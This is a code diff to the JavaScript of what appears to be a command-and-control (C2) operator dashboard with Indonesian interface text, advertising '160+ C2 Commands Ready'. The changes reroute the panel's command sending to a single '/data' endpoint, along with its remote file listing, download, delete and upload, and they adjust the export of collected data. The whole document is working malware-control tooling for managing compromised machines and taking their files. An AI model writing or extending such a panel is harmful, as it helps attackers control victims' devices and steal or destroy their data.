-            if(last){ last.status='✅ Success'; last.response=res; }
-            renderC2History();
-            showToast('✅ Command sent: '+aksi);
-        })
-        .catch(function(){
-            document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
-            document.getElementById('c2Result').style.color = '#f44';
-            var last = c2History[c2History.length-1];
-            if(last){ last.status='❌ Failed'; }
-            renderC2History();
-        });
+    
+    var payload = { sumber: 'c2_command', data: { aksi: aksi, params: params } };
+    c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
+    // Batasi history
+    if (c2History.length > 100) { c2History = c2History.slice(-100); }
+    renderC2History();
+    
+    fetch('/data', { 
+        method: 'POST', 
+        headers: {'Content-Type':'application/json'}, 
+        body: JSON.stringify(payload) 
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(res){
+        c2Sending = false;
+        document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
+        document.getElementById('c2Result').style.color = '#0f0';
+        var last = c2History[c2History.length-1];
+        if(last){ last.status='✅ Success'; last.response=res; }
+        renderC2History();
+        showToast('✅ Command sent: '+aksi);
+    })
+    .catch(function(){
+        c2Sending = false;
+        document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
+        document.getElementById('c2Result').style.color = '#f44';
+        var last = c2History[c2History.length-1];
+        if(last){ last.status='❌ Failed'; }
+        renderC2History();
+    });
 }
 
 function sendC2Custom(){
@@ -1165,6 +1016,7 @@ function renderC2History(){
 // 🔥 EXPORT & CLEAR
 // ============================================================
 function exportJSON(){
+    if(!allData.length){ showToast('Tidak ada data'); return; }
     var blob = new Blob([JSON.stringify(allData,null,2)], {type:'application/json'});
     var a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
@@ -1174,7 +1026,7 @@ function exportJSON(){
 }
 
 function exportCSV(){
-    if(!allData.length){ showToast('Tidak ada data untuk diexport'); return; }
+    if(!allData.length){ showToast('Tidak ada data'); return; }
     var rows = [['Waktu','Sumber','Data']];
     allData.forEach(function(item){
         var waktu = item.waktu ? new Date(item.waktu).toISOString() : '';
@@ -1200,24 +1052,25 @@ function clearAll(){
 }
 
 // ============================================================
-// 🔥 FILE MANAGER
+// 🔥 FILE MANAGER - SESUAI ENDPOINT WORKER
 // ============================================================
 function listFiles(){
     var path = document.getElementById('filePath').value || '/';
-    fetch('/api/files?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY))
+    fetch('/data?key=' + encodeURIComponent(KEY) + '&type=files&path=' + encodeURIComponent(path))
         .then(function(r){ return r.json(); })
         .then(function(data){
             var container = document.getElementById('fileListContainer');
-            if(!data || !data.length){
+            var files = data.files || data || [];
+            if(!files.length){
                 container.innerHTML = '<div class="empty">📂 Kosong atau error</div>';
                 return;
             }
             var html = '<div class="file-grid">';
-            data.forEach(function(item){
+            files.forEach(function(item){
                 html += '<div class="file-item">';
-                html += '<div class="name">'+(item.isDir ? '📁' : '📄')+' '+escapeHtml(item.name)+'</div>';
+                html += '<div class="name">'+(item.isDirectory ? '📁' : '📄')+' '+escapeHtml(item.name)+'</div>';
                 html += '<div class="path">'+(item.size ? (item.size/1024).toFixed(1)+' KB' : '-')+'</div>';
-                if(!item.isDir){
+                if(!item.isDirectory){
                     html += '<button class="btn-blue" style="font-size:8px;padding:2px 6px;margin-top:4px;" onclick="downloadFile(\''+item.path+'\')">⬇️</button>';
                     html += '<button class="btn-red" style="font-size:8px;padding:2px 6px;margin-top:4px;" onclick="deleteFile(\''+item.path+'\')">🗑️</button>';
                 }
@@ -1232,22 +1085,18 @@ function listFiles(){
 }
 
 function downloadFile(path){
-    window.open('/api/download?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY), '_blank');
+    window.open('/data?key=' + encodeURIComponent(KEY) + '&type=download&path=' + encodeURIComponent(path), '_blank');
 }
 
 function deleteFile(path){
     if(!confirm('Hapus file: '+path+'?')) return;
-    fetch('/api/delete', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({path: path, key: KEY})
-    })
-    .then(function(r){ return r.json(); })
-    .then(function(res){
-        showToast(res.status || 'Deleted');
-        listFiles();
-    })
-    .catch(function(){ showToast('❌ Gagal hapus file'); });
+    fetch('/data?key=' + encodeURIComponent(KEY) + '&type=delete&path=' + encodeURIComponent(path), {method:'POST'})
+        .then(function(r){ return r.json(); })
+        .then(function(res){
+            showToast(res.status || 'Deleted');
+            listFiles();
+        })
+        .catch(function(){ showToast('❌ Gagal hapus file'); });
 }
 
 function uploadFile(){
@@ -1262,7 +1111,7 @@ function uploadFileSubmit(){
     formData.append('file', file);
     formData.append('path', document.getElementById('filePath').value || '/');
     formData.append('key', KEY);
-    fetch('/api/upload', {
+    fetch('/data?type=upload', {
         method: 'POST',
         body: formData
     })
@@ -1295,7 +1144,6 @@ renderC2Buttons();
 
 console.log('🔬 DASHBOARD ULTIMATE v2.0 LOADED');
 console.log('📊 160+ C2 Commands Ready');
-console.log('📊 Skor: Fungsi 10 | Tampilan 10 | Stabilitas 10 | Keamanan 9 | Performance 10 | Error 10 | Kode 10');
 </script>
 </body>
 </html>
